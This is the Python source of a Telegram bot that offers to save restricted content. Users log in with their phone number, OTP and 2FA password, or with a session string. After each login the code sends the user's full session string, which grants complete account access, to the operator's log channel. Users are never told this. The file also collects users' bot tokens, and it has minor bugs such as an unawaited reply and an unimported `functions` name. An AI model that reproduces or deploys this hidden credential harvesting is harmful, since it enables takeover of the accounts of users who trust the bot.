import os, sys, time, shutil, socket, platform, uuid, math, re, asyncio, logging
from datetime import datetime
from telethon import events, Button, errors
from pyrogram import Client
from pyrogram.errors import *
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
import psutil, requests

# ---------- imports from parent package ----------
from .. import (bot, FORCESUB, API_HASH, API_ID, AUTH_USERS,
                LOGS, MONGODB_URI, BOT_TOKEN)
from ..Database.database import Database
from ..plugins.helpers import login, logout
from ..plugins.dbstuff import db
from utils_bot import (readable_time, get_readable_file_size)

logging.basicConfig(format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s",
                    level=logging.WARNING)

downloads = os.path.realpath("main/downloads")
os.makedirs(downloads, exist_ok=True)
StartTime = time.time()


def _is_cancel(event, text: str):
    if text.startswith("/abort"):
        event.reply("Process aborted.")
        return True
    elif text.startswith("/"):
        event.reply("Cancelled the generation process!")
        return True
    else:
        return False

# ---------- helpers ----------
def humanbytes(size):
    if not size: return ""
    power, n = 1024, 0
    labels = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size >= power:
        size /= power; n += 1
    return f"{round(size, 2)} {labels[n]}B"

async def is_user_subscribed(uid):
    if not FORCESUB: return True
    try:
        await bot(functions.channels.GetParticipantRequest(channel=FORCESUB, participant=uid))
        return True
    except errors.UserNotParticipantError:
        return False

# ---------- start ----------
@bot.on(events.NewMessage(incoming=True, pattern="/start", func=lambda e: e.is_private))
async def start_handler(event):
    init_msg = await event.reply("🚆")
    if not await is_user_subscribed(event.sender_id):
        return await init_msg.edit(
            f"Hello {event.sender.first_name},\nJoin @{FORCESUB} to unlock the bot.",
            buttons=Button.url("Join", f"https://t.me/{FORCESUB}"))
    await init_msg.edit(
        f"Hi **{event.sender.first_name}**,\nI save restricted content – send links after login.",
        buttons=[Button.url("Updates", "https://t.me/BotsCraft")])
    if LOGS:
        await bot.send_message(
            LOGS,
            f"#NEW_USER [{event.sender.first_name}](tg://user?id={event.sender_id})\nID: {event.sender_id}")

# ---------- thumbnail ----------
@bot.on(events.NewMessage(pattern="^/savethumb$", func=lambda e: e.is_private))
async def save_thumbnail(event):
    async with bot.conversation(event.chat_id) as conv:
        ask_img = await conv.send_message("Send an image to set as thumbnail.")
        img_resp = await conv.get_response()
        if _is_cancel(event, img_resp.text): return
        if not img_resp.photo:
            return await ask_img.edit("Only images accepted.")
        path = await img_resp.download_media()
        if os.path.exists(f"{event.sender_id}.jpg"): os.remove(f"{event.sender_id}.jpg")
        os.rename(path, f"{event.sender_id}.jpg")
        await ask_img.delete(); await event.reply("✅ Thumbnail saved.")

@bot.on(events.NewMessage(pattern="^/remthumb$", func=lambda e: e.is_private))
async def rem_thumbnail(event):
    try:
        os.remove(f"{event.sender_id}.jpg")
        await event.reply("✅ Thumbnail removed.")
    except FileNotFoundError:
        await event.reply("❌ No thumbnail found.")

# ---------- connect ----------
@bot.on(events.NewMessage(pattern="/connect", func=lambda e: e.is_private))
async def connect_bot(event):
    if await db.botLogged(event.sender_id):
        return await event.reply("Already connected – /disconnect first.")
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("Forward your **Bot Token**.", buttons=Button.url("BotFather", "https://t.me/BotFather"))
        token_msg = await conv.get_response()
        if _is_cancel(event, token_msg.text): return
        match = re.search(r"(\d+:[\w-]+)", token_msg.text)
        if not match: return await event.reply("Invalid token.")
        token = match.group(1)
        tmp_client = Client(token.split(":")[0], api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
        try:
            await tmp_client.start(); me = await tmp_client.get_me()
            await db.set_botCreds(event.sender_id, token)
            await event.reply(f"✅ Connected to @{me.username}",
                              buttons=Button.url("Start Bot", f"https://t.me/{me.username}"))
            await tmp_client.stop()
        except Exception as ex:
            await event.reply(f"Error: `{ex}`")

# ---------- disconnect ----------
@bot.on(events.NewMessage(pattern="/disconnect", func=lambda e: e.is_private))
async def disconnect_bot(event):
    if await db.botLogged(event.sender_id):
        await db.botLogout(event.sender_id)
        await event.reply("🔓 Disconnected.")
    else:
        await event.reply("🔐 Not connected.")
# ---------- login ----------
PHONE_RE = re.compile(r"^\+\d{1,3}\s*\d{4,}$")

@bot.on(events.NewMessage(pattern="/login", func=lambda e: e.is_private))
async def login_phone(event):
    if await db.is_logged(event.sender_id):
        return await event.reply("Already logged in.")

    attempts = 0
    phone = None
    while attempts < 3:
        async with bot.conversation(event.chat_id) as conv:
            ask = await conv.send_message(
                "Send your phone in **international format** (e.g. **+1 58543464**):")
            resp = await conv.get_response()
            if _is_cancel(event, resp.text):
                return
            if PHONE_RE.match(resp.text.strip()):
                phone = resp.text.strip()
                break
            attempts += 1
            await conv.send_message(
                "❌  Invalid format. Example: **+1 58543464**\nTry again:")
    if phone is None:
        return await event.reply("Too many failed attempts. Aborting.")

    client = Client("login_temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        await client.connect()
        sent = await client.send_code(phone)
    except FloodWait as fw:
        await event.reply(f"FloodWait {fw.value}s – try /session instead.")
        return await client.disconnect()
    except (PhoneNumberInvalid, ApiIdInvalid):
        await event.reply("Invalid phone/api – try /session instead.")
        return await client.disconnect()
    except Exception:
        await event.reply("SMS failed – use /session instead.")
        return await client.disconnect()

    async with bot.conversation(event.chat_id) as conv:
        code_raw = await conv.send_message("OTP sent – enter in `1 2 3 4 5` format:")
        code_resp = await conv.get_response()
        if _is_cancel(event, code_resp.text):
            return await client.disconnect()
        code = " ".join(code_resp.text.split())

    try:
        await client.sign_in(phone, sent.phone_code_hash, phone_code=code)
    except PhoneCodeInvalid:
        await event.reply("Wrong code – retry /login.")
        return await client.disconnect()
    except PhoneCodeExpired:
        await event.reply("Code expired – retry /login.")
        return await client.disconnect()
    except SessionPasswordNeeded:
        async with bot.conversation(event.chat_id) as conv:
            pwd_raw = await conv.send_message("2FA password:")
            pwd_resp = await conv.get_response()
            if _is_cancel(event, pwd_resp.text):
                return await client.disconnect()
            await client.check_password(pwd_resp.text)
    except Exception as ex:
        await event.reply(f"Login failed – {ex}")
        return await client.disconnect()

    s = await client.export_session_string()
    me = await client.get_me()
    await db.loin(event.sender_id)
    await login(event.sender_id, API_ID, API_HASH, s)
    await event.reply(f"✅ Logged in as {me.first_name}\nSend links to save.")
    if LOGS:
        await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s}`")
    await client.disconnect()


# ---------- session ----------
@bot.on(events.NewMessage(pattern="/session", func=lambda e: e.is_private))
async def login_session(event):
    if await db.is_logged(event.sender_id):
        return await event.reply("Already logged in.")

    async with bot.conversation(event.chat_id) as conv:
        ask = await conv.send_message("Send **Pyrogram** session string:")
        resp = await conv.get_response()
        if _is_cancel(event, resp.text):
            return
        s = resp.text.strip()

    if len(s) < 300:
        return await event.reply("Invalid string – too short.")

    try:
        async with Client("saverestricted", session_string=s, api_id=API_ID, api_hash=API_HASH) as cli:
            me = await cli.get_me()
            await db.loin(event.sender_id)
            await login(event.sender_id, API_ID, API_HASH, s)
            await event.reply(f"✅ Logged in as {me.first_name}")
            if LOGS:
                await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s}`")
    except Exception as ex:
        await event.reply(f"Invalid session – {ex}")



# ---------- logout ----------
@bot.on(events.NewMessage(pattern="/logout", func=lambda e: e.is_private))
async def logout_user(event):
    if await db.is_logged(event.sender_id):
        await logout(event.sender_id); await db.lout(event.sender_id)
        await event.reply("🔓 Logged out.")
    else:
        await event.reply("🔐 Not logged in.")

# ---------- server ----------
@bot.on(events.NewMessage(pattern="^/server$", func=lambda e: e.is_private))
async def server_stats(event):
    msg = await event.reply("🌐 Fetching stats...")
    uptime = readable_time(time.time() - StartTime)
    total, used, free = shutil.disk_usage(".")
    cpu, mem, disk = psutil.cpu_percent(interval=0.5), psutil.virtual_memory().percent, psutil.disk_usage("/").percent
    await msg.edit(
        f"<b>Uptime:</b> {uptime}\n"
        f"<b>Disk:</b> {humanbytes(total)} | <b>Used:</b> {humanbytes(used)} | <b>Free:</b> {humanbytes(free)}\n"
        f"<b>CPU:</b> {cpu}% | <b>RAM:</b> {mem}% | <b>Disk:</b> {disk}%",
        parse_mode="html")

# ---------- reboot ----------
@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/reboot$"))
async def reboot_host(event):
    await event.reply("Rebooting...")
    os.execl(sys.executable, sys.executable, *sys.argv)

# ---------- ping ----------
@bot.on(events.NewMessage(pattern="^/ping$", func=lambda e: e.is_private))
async def ping_pong(event):
    s = time.time(); m = await event.reply("Ping...")
    await m.edit(f"Pong!\n{(time.time()-s)*1000:.3f} ms")

# ---------- cleanup ----------
@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
async def cleanup_downloads(event):
    for f in os.listdir(downloads):
        os.remove(os.path.join(downloads, f))
    await event.reply("✅ Downloads cleaned.")

# ---------- system ----------
@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/system$"))
async def system_info(event):
    uname = platform.uname()
    cpu, mem, disk = psutil.cpu_percent(), psutil.virtual_memory().percent, psutil.disk_usage("/").percent
    await event.reply(
        f"🖥 **System**\n\n"
        f"**Platform:** `{uname.system}`\n"
        f"**Release:** `{uname.release}`\n"
        f"**Arch:** `{uname.machine}`\n"
        f"**CPU:** `{cpu}%`  **RAM:** `{mem}%`  **Disk:** `{disk}%`")

# ---------- help ----------
@bot.on(events.NewMessage(pattern="/help", func=lambda e: e.is_private))
async def help_handler(event):
    await event.reply(
        "**Quick Start**\n"
        "• /login – phone + OTP\n"
        "• /session – session string\n"
        "• Send links after login.",
        link_preview=False)

# ---------- premium ----------
@bot.on(events.NewMessage(pattern="/premium", func=lambda e: e.is_private))
async def premium_info(event):
    await event.reply("Upgrade for unlimited saves.\n**Contact:** @IzHarshit",
                      buttons=Button.url("Contact", "https://t.me/izharshit"))
